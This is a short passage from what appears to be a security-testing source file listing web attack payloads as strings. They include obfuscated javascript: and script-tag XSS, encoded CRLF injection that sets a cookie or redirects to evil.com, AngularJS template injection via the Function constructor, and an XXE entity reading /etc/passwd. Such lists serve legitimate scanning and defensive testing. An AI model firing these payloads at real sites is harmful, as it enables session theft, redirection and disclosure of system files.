	"\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)",
	"\\'\\\"\\><script>alert(1)</script>",
// CRLF Injection payloads already defined above
	"%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection", // UTF-8 encoded CRLF
	"%E5%98%8D%E5%98%8ALocation: https://evil.com",  // UTF-8 encoded CRLF
	"{{ \"string\".constructor.constructor(\"alert(1)\")() }}",
	"{{ this.constructor.constructor(\"alert(1)\")() }}",
	"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root xmlns=\"http://example.com/&xxe;\"></root>",
	"{\"email\": \"attacker@example.com\"}",
